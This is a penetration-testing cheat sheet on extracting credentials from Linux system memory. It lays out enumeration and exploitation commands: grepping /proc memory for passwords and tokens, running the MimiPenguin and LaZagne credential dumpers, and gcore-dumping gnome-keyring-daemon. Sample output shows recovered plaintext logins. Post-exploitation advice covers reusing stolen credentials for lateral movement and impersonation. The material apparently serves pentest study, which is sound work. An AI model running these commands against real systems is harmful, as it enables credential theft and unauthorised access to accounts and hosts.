### Technique Name:

Extracting Credentials from System Memory
### Summary:

Sensitive data such as plaintext passwords, passphrases, and tokens can temporarily reside in system memory. By dumping and analyzing memory of running processes or the entire system, attackers may uncover credentials used by applications, services, or users.
### Conditions:

- Sudo/root privileges are typically required for full memory access.    
- Useful especially on systems running GUI environments or background services like GNOME Keyring, SSH agents, or web browsers.
### Enumeration:
#### 1. List Running Processes

```bash
ps aux
```
#### 2. Identify High-Value Targets

Look for:

- Browsers (`firefox`, `chrome`)    
- SSH agents
- GUI sessions (GNOME, KDE)
- Password managers
#### 3. Analyze Memory of Specific Process (as root)

```bash
strings /proc/<PID>/mem 2>/dev/null | grep -iE 'pass|user|login|token|key'
```
### Exploitation:
#### 1. Using MimiPenguin

Tool for extracting login credentials from memory in GUI-based environments.

Example:

```bash
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin
sudo ./mimipenguin.sh
```

Output:

```text
[SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY
```
#### 2. Using LaZagne

LaZagne includes memory parsing routines and extracts credentials from a variety of sources including browsers, databases, SSH, and system services.

Example:

```bash
python2 laZagne.py all
```

Output:

```text
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY
```
#### 3. Manual Gcore Dump of Process

```bash
pidof gnome-keyring-daemon
gcore <PID>
strings core.<PID> | grep -iE 'pass|user|login'
```
### Post-Exploitation:

- Reuse any recovered passwords or tokens for lateral movement, SSH access, database logins, etc.    
- If browser credentials were found, attempt further web app exploitation.
- Check for sessions or cached tokens usable for impersonation.
